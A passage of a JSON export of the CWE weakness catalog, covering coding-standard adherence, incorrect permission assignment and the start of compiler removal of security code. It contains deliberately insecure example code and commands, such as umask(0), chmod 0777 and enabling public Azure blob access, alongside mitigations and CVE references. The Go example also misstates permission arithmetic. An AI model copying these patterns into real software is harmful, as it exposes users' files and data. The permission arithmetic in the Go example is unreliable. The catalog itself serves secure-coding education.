        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "\n\nThis overlaps verification errors, permissions, and privileges.\n\n\nA closely related weakness is the incorrect assignment of groups to a resource. It is not clear whether it would fall under this entry or require a different entry.\n"
        }
      ]
    },
    {
      "ID": "710",
      "Name": "Improper Adherence to Coding Standards",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Document and closely follow coding standards."
        },
        {
          "Phase": [
            "Testing",
            "Implementation"
          ],
          "Description": "Where possible, use automated tools to enforce the standards."
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar.",
        "Comments": "Consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "732",
      "Name": "Incorrect Permission Assignment for Critical Resource",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.",
      "ExtendedDescription": "When a resource is given a permission setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution, or sensitive user data. For example, consider a misconfigured storage account for the cloud that can be read or written by a public or anonymous user.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Cloud Computing",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "\n\nREALIZATION: This weakness is caused during implementation of an architectural security tactic.\n\n\nThe developer might make certain assumptions about the environment in which the product operates - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.\n"
        },
        {
          "Phase": "Installation",
          "Note": "The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "An attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker may be able to modify critical properties of the associated resource to gain privileges, such as replacing a world-writable executable with a Trojan horse."
        },
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Other"
          ],
          "Note": "An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAutomated static analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc. Automated techniques may be able to detect the use of library functions that modify permissions, then analyze function calls for arguments that contain potentially insecure values.\n\n\nHowever, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated static analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.\n\n\nWhen custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated static analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.\n"
        },
        {
          "Method": "Automated Dynamic Analysis",
          "Description": "\n\nAutomated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.\n\n\nHowever, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.\n\n\nWhen custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.\n"
        },
        {
          "DetectionMethodID": "DM-7",
          "Method": "Manual Analysis",
          "Description": "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        },
        {
          "Method": "Manual Static Analysis",
          "Description": "Manual static analysis may be effective in detecting the use of custom permissions models and functions. The code could then be examined to identifying usage of the related functions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software."
        },
        {
          "Method": "Manual Dynamic Analysis",
          "Description": "Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software."
        },
        {
          "Method": "Fuzzing",
          "Description": "Fuzzing is not effective in detecting this weakness."
        },
        {
          "DetectionMethodID": "DM-11.1",
          "Method": "Black Box",
          "Description": "\n\nUse monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.\n\n\nAttach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.\n",
          "EffectivenessNotes": "Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as \"private,\" but the blog system inadvertently marks it as \"public.\""
        },
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInter-application Flow Analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tHost-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tHost Application Interface Scanner\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tAutomated Monitored Execution\n\t\tForced Path Execution",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tConfiguration Checker",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly."
        },
        {
          "MitigationID": "MIT-22",
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Sandbox or Jail",
          "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
        },
        {
          "Phase": [
            "Implementation",
            "Installation"
          ],
          "Description": "During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.",
          "Effectiveness": "High"
        },
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "For all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.",
          "Effectiveness": "High"
        },
        {
          "Phase": [
            "Documentation"
          ],
          "Description": "Do not suggest insecure configuration changes in documentation, especially if those configurations can extend to resources and other programs that are outside the scope of the application."
        },
        {
          "Phase": [
            "Installation"
          ],
          "Description": "Do not assume that a system administrator will manually change the configuration to the settings that are recommended in the software's manual."
        },
        {
          "MitigationID": "MIT-37",
          "Phase": [
            "Operation",
            "System Configuration"
          ],
          "Strategy": "Environment Hardening",
          "Description": "Ensure that the software runs properly under the United States Government Configuration Baseline (USGCB) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."
        },
        {
          "Phase": [
            "Implementation",
            "System Configuration",
            "Operation"
          ],
          "Description": "When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code sets the umask of the process to 0 before creating a file and writing \"Hello world\" into the file."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define OUTFILE \"hello.out\"\n\tumask(0);\n\tFILE *out;\n```\n/* Ignore link following (CWE-59) for brevity */* \n\t\n\tout = fopen(OUTFILE, \"w\");\n\tif (out) {\n\t```\n\t\tfprintf(out, \"hello world!\\n\");\n\t\tfclose(out);\n\t}\n```"
            },
            {
              "BodyText": "After running this program on a UNIX system, running the \"ls -l\" command might return the following output:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out\n```"
            },
            {
              "BodyText": "The \"rw-rw-rw-\" string indicates that the owner, group, and world (all users) can read the file and write to it."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction createUserDir($username){\n\t\t$path = '/home/'.$username;\n\t\tif(!mkdir($path)){\n\t\t\treturn false;\n\t\t}\n\t\tif(!chown($path,$username)){\n\t\t\trmdir($path);\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n```"
            },
            {
              "BodyText": "Because the optional \"mode\" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups."
            },
            {
              "BodyText": "This code may also be vulnerable to Path Traversal (CWE-22) attacks if an attacker supplies a non alphanumeric username."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code snippet might be used as a monitor to periodically record whether a web site is alive. To ensure that the file can always be modified, the code uses chmod() to make the file world-writable."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$fileName = \"secretFile.out\";\n\tif (-e $fileName) {\n\t\tchmod 0777, $fileName;\n\t}\n\tmy $outFH;\n\tif (! open($outFH, \">>$fileName\")) {\n\t\tExitError(\"Couldn't append to $fileName: $!\");\n\t}\n\tmy $dateString = FormatCurrentTime();\n\tmy $status = IsHostAlive(\"cwe.mitre.org\");\n\tprint $outFH \"$dateString cwe status: $status!\\n\";\n\tclose($outFH);\n```"
            },
            {
              "BodyText": "The first time the program runs, it might create a new file that inherits the permissions from its environment. A file listing might look like:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out\n```"
            },
            {
              "BodyText": "This listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system."
            },
            {
              "BodyText": "The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out\n```"
            },
            {
              "BodyText": "Perhaps the programmer tried to do this because a different process uses different permissions that might prevent the file from being updated."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This program creates and reads from an admin file to determine privilege information."
            },
            {
              "BodyText": "If the admin file doesn't exist, the program will create one. In order to create the file, the program must have write privileges to write to the file. After the file is created, the permissions need to be changed to read only."
            },
            {
              "Nature": "Bad",
              "Language": "Go",
              "ExampleCode": "```\n\t const adminFile = \"/etc/admin-users\"\n\t func createAdminFileIfNotExists() error { \n\t\t file, err := os.Create(adminFile)\n\t\t if err != nil {\n\t\t\t return err \n\t\t }\n\t\t return nil\n\t }\n\t func changeModeOfAdminFile() error { \n\t\t fileMode := os.FileMode(0440)\n\t\t if err := os.Chmod(adminFile, fileMode); err != nil {\n\t\t\t return err \n\t\t }\n\t\t return nil\n\t }\n```"
            },
            {
              "BodyText": "os.Create will create a file with 0666 permissions before umask if the specified file does not exist. A typical umask of 0022 would result in the file having 0644 permissions. That is, the file would have world-writable and world-readable permissions."
            },
            {
              "BodyText": "In this scenario, it is advised to use the more customizable method of os.OpenFile with the os.O_WRONLY and os.O_CREATE flags specifying 0640 permissions to create the admin file."
            },
            {
              "BodyText": "This is because on a typical system where the umask is 0022, the perm 0640 applied in os.OpenFile will result in a file of 0620 where only the owner and group can write."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following command recursively sets world-readable permissions for a directory and all of its children:"
            },
            {
              "Nature": "Bad",
              "Language": "Shell",
              "ExampleCode": "```\n\tchmod -R ugo+r DIRNAME\n```"
            },
            {
              "BodyText": "If this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data, this could become a security problem."
            }
          ]
        },
        {
          "ID": "DX-160",
          "Entries": [
            {
              "IntroText": "The following Azure command updates the settings for a storage account:"
            },
            {
              "Nature": "Bad",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access true\n```"
            },
            {
              "BodyText": "However, \"Allow Blob Public Access\" is set to true, meaning that anonymous/public users can access blobs."
            },
            {
              "BodyText": "The command could be modified to disable \"Allow Blob Public Access\" by setting it to false."
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access false\n```"
            }
          ]
        },
        {
          "ID": "DX-161",
          "Entries": [
            {
              "IntroText": "The following Google Cloud Storage command gets the settings for a storage account named 'BUCKET_NAME':"
            },
            {
              "Nature": "Informative",
              "Language": "Shell",
              "ExampleCode": "```\n\t gsutil iam get gs://BUCKET_NAME\n```"
            },
            {
              "BodyText": "Suppose the command returns the following result:"
            },
            {
              "Nature": "Bad",
              "Language": "JSON",
              "ExampleCode": "{\n\n```\n\t \"bindings\":[{\n\t\t \"members\":[\n\t\t\t \"projectEditor: PROJECT-ID\",\n\t\t\t \"projectOwner: PROJECT-ID\" \n\t\t ],\n\t\t \"role\":\"roles/storage.legacyBucketOwner\"\n\t },\n\t {\n\t\t \"members\":[ \n\t\t\t \"allUsers\",\n\t\t\t \"projectViewer: PROJECT-ID\"\n\t\t\t ],\n\t\t\t \"role\":\"roles/storage.legacyBucketReader\"\n\t\t }\n\t ]\n }\n```"
            },
            {
              "BodyText": "This result includes the \"allUsers\" or IAM role added as members, causing this policy configuration to allow public access to cloud storage resources. There would be a similar concern if \"allAuthenticatedUsers\" was present."
            },
            {
              "BodyText": "The command could be modified to remove \"allUsers\" and/or \"allAuthenticatedUsers\" as follows:"
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "gsutil iam ch -d allUsers gs://BUCKET_NAME\n gsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-29527",
          "Description": "Go application for cloud management creates a world-writable sudoers file that allows local attackers to inject sudo rules and escalate privileges to root by winning a race condition.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29527"
        },
        {
          "Reference": "CVE-2009-3482",
          "Description": "Anti-virus product sets insecure \"Everyone: Full Control\" permissions for files under the \"Program Files\" folder, allowing attackers to replace executables with Trojan horses.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3482"
        },
        {
          "Reference": "CVE-2009-3897",
          "Description": "Product creates directories with 0777 permissions at installation, allowing users to gain privileges and access a socket used for authentication.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3897"
        },
        {
          "Reference": "CVE-2009-3489",
          "Description": "Photo editor installs a service with an insecure security descriptor, allowing users to stop or start the service, or execute commands as SYSTEM.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3489"
        },
        {
          "Reference": "CVE-2020-15708",
          "Description": "socket created with insecure permissions",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-15708"
        },
        {
          "Reference": "CVE-2009-3289",
          "Description": "Library function copies a file to a new target and uses the source file's permissions for the target, which is incorrect when the source file is a symbolic link, which typically has 0777 permissions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3289"
        },
        {
          "Reference": "CVE-2009-0115",
          "Description": "Device driver uses world-writable permissions for a socket file, allowing attackers to inject arbitrary commands.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0115"
        },
        {
          "Reference": "CVE-2009-1073",
          "Description": "LDAP server stores a cleartext password in a world-readable file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1073"
        },
        {
          "Reference": "CVE-2009-0141",
          "Description": "Terminal emulator creates TTY devices with world-writable permissions, allowing an attacker to write to the terminals of other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0141"
        },
        {
          "Reference": "CVE-2008-0662",
          "Description": "VPN product stores user credentials in a registry key with \"Everyone: Full Control\" permissions, allowing attackers to steal the credentials.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0662"
        },
        {
          "Reference": "CVE-2008-0322",
          "Description": "Driver installs its device interface with \"Everyone: Write\" permissions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0322"
        },
        {
          "Reference": "CVE-2009-3939",
          "Description": "Driver installs a file with world-writable permissions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3939"
        },
        {
          "Reference": "CVE-2009-3611",
          "Description": "Product changes permissions to 0777 before deleting a backup; the permissions stay insecure for subsequent backups.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3611"
        },
        {
          "Reference": "CVE-2007-6033",
          "Description": "Product creates a share with \"Everyone: Full Control\" permissions, allowing arbitrary program execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6033"
        },
        {
          "Reference": "CVE-2007-5544",
          "Description": "Product uses \"Everyone: Full Control\" permissions for memory-mapped files (shared memory) in inter-process communication, allowing attackers to tamper with a session.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5544"
        },
        {
          "Reference": "CVE-2005-4868",
          "Description": "Database product uses read/write permissions for everyone for its shared memory, allowing theft of credentials.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4868"
        },
        {
          "Reference": "CVE-2004-1714",
          "Description": "Security product uses \"Everyone: Full Control\" permissions for its configuration files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1714"
        },
        {
          "Reference": "CVE-2001-0006",
          "Description": "\"Everyone: Full Control\" permissions assigned to a mutex allows users to disable network connectivity.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0006"
        },
        {
          "Reference": "CVE-2002-0969",
          "Description": "Chain: database product contains buffer overflow that is only reachable through a .ini configuration file - which has \"Everyone: Full Control\" permissions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0969"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "FIO03-J",
          "EntryName": "Create files with appropriate access permission"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SEC01-J",
          "EntryName": "Do not allow tainted variables in privileged blocks"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ENV03-J",
          "EntryName": "Do not grant dangerous combinations of permissions"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO06-C",
          "EntryName": "Create files with appropriate access permissions"
        }
      ],
      "RelatedAttackPatterns": [
        "1",
        "122",
        "127",
        "17",
        "180",
        "206",
        "234",
        "60",
        "61",
        "62",
        "642"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 9, \"File Permissions.\" Page 495",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-207",
          "Section": "Chapter 8, \"Access Control.\" Page 194",
          "Authors": [
            "John Viega",
            "Gary McGraw"
          ],
          "Title": "Building Secure Software: How to Avoid Security Problems the Right Way",
          "Edition": "1st Edition",
          "PublicationYear": "2002",
          "Publisher": "Addison-Wesley"
        },
        {
          "ExternalReferenceID": "REF-594",
          "Authors": [
            "Jason Lam"
          ],
          "Title": "Top 25 Series - Rank 21 - Incorrect Permission Assignment for Critical Response",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "24",
          "Publisher": "SANS Software Security Institute",
          "URL": "http://software-security.sans.org/blog/2010/03/24/top-25-series-rank-21-incorrect-permission-assignment-for-critical-response"
        },
        {
          "ExternalReferenceID": "REF-199",
          "Authors": [
            "NIST"
          ],
          "Title": "United States Government Configuration Baseline (USGCB)",
          "URL": "https://csrc.nist.gov/Projects/United-States-Government-Configuration-Baseline",
          "URLDate": "2023-03-28"
        },
        {
          "ExternalReferenceID": "REF-1287",
          "Section": "Details of Problematic Mappings",
          "Authors": [
            "MITRE"
          ],
          "Title": "Supplemental Details - 2022 CWE Top 25",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "28",
          "URL": "https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails"
        },
        {
          "ExternalReferenceID": "REF-1307",
          "Section": "Section 3.7",
          "Authors": [
            "Center for Internet Security"
          ],
          "Title": "CIS Microsoft Azure Foundations Benchmark version 1.5.0",
          "PublicationYear": "2022",
          "PublicationMonth": "08",
          "PublicationDay": "16",
          "URL": "https://www.cisecurity.org/benchmark/azure",
          "URLDate": "2023-01-19"
        },
        {
          "ExternalReferenceID": "REF-1327",
          "Section": "Section 5.1",
          "Authors": [
            "Center for Internet Security"
          ],
          "Title": "CIS Google Cloud Computing Platform Benchmark version 1.3.0",
          "PublicationYear": "2022",
          "PublicationMonth": "03",
          "PublicationDay": "31",
          "URL": "https://www.cisecurity.org/benchmark/google_cloud_computing_platform",
          "URLDate": "2023-04-24"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "While the name itself indicates an assignment of permissions for resources, this is often misused for vulnerabilities in which \"permissions\" are not checked, which is an \"authorization\" weakness (CWE-285 or descendants) within CWE's model [REF-1287].",
        "Comments": "Closely analyze the specific mistake that is allowing the resource to be exposed, and perform a CWE mapping for that mistake.",
        "Reasons": [
          "Frequent Misuse"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693)."
        }
      ]
    },
    {
      "ID": "733",
      "Name": "Compiler Optimization Removal or Modification of Security-critical Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The developer builds a security-critical protection mechanism into the software, but the compiler optimizes the program such that the mechanism is removed or modified.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1038",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Compiled",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Black Box",
          "Description": "This specific weakness is impossible to detect using black box methods. While an analyst could examine memory to see that it has not been scrubbed, an analysis of the executable would not be successful. This is because the compiler has already removed the relevant code. Only the source code shows whether the programmer intended to clear the memory or not, so this weakness is indistinguishable from others."
        },
        {
          "Method": "White Box",
          "Description": "This weakness is only detectable using white box methods (see black box detection factor). Careful analysis is required to determine if the code is likely to be removed by the compiler."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-200",
          "Entries": [
            {
              "IntroText": "The following code reads a password from the user, uses the password to connect to a back-end mainframe and then attempts to scrub the password from memory using memset()."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid GetData(char *MFAddr) {\n\t\t\tchar pwd[64];\n\t\t\tif (GetPasswordFromUser(pwd, sizeof(pwd))) {\n\t\t\t\t\tif (ConnectToMainframe(MFAddr, pwd)) {\n```\n// Interaction with mainframe* \n\t\t\t\t\t\t\t}}\n\t\t\tmemset(pwd, 0, sizeof(pwd));}"
            },
            {
              "BodyText": "The code in the example will behave correctly if it is executed verbatim, but if the code is compiled using an optimizing compiler, such as Microsoft Visual C++ .NET or GCC 3.x, then the call to memset() will be removed as a dead store because the buffer pwd is not used after its value is overwritten [18]. Because the buffer pwd contains a sensitive value, the application may be vulnerable to attack if the data are left memory resident. If attackers are able to access the correct region of memory, they may use the recovered password to gain control of the system."
            },
            {
